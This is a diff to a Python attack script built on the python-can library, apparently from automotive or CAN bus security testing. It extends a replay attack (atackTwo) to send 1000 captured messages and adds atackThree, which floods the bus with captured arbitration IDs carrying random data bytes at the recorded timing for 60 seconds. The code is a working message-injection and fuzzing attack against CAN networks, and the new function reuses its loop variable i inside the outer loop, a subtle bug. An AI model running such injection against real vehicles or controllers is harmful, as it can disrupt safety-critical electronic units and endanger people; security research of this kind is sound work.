@@ -15,7 +15,7 @@ def atackTwo(msgToSend):
     prev = time.time()
     stop = True
     while(stop):
-        for i in range(0,2*5,2):
+        for i in range(0,1000):
             msg = can.Message(
                 arbitration_id=msgToSend[i][1], data=msgToSend[i][2], is_extended_id=True
             )
@@ -24,7 +24,25 @@ def atackTwo(msgToSend):
         actual = time.time()
         if((actual-prev)>60.0):
             stop = False
-
+def atackThree(msgToSend):
+    prev = time.time()
+    stop = True
+    
+    while(stop):
+        for i in range(0,200):
+            msgLen = len(msgToSend[i][2])
+            dataToSen = []
+            for i in range(msgLen):
+                dataToSen.append(random.randint(0,254))
+            #print(dataToSen)
+            msg = can.Message(
+                arbitration_id=msgToSend[i][1], data=dataToSen, is_extended_id=True
+            )   
+            time.sleep(msgToSend[i+1][0]*0.98)
+            send_one(msg)
+        actual = time.time()
+        if((actual-prev)>60.0):
+            stop = False
 def send_one(msg):
     """Sends a single message."""
     with can.Bus() as bus:
@@ -33,7 +51,7 @@ def send_one(msg):
 
         try:
             bus.send(msg)
-            print(f"Message sent on {bus.channel_info}")
+            #print(f"Message sent on {bus.channel_info}")
         except can.CanError:
             print("Message NOT sent")
 
@@ -84,7 +102,7 @@ if __name__ == "__main__":
             atackTwo(msgToSend)
            
         elif pressedKey == '3':
-            print("3")      
+            atackThree(msgToSend)     
         elif pressedKey == 'q':    
             systems.exit()
         else:
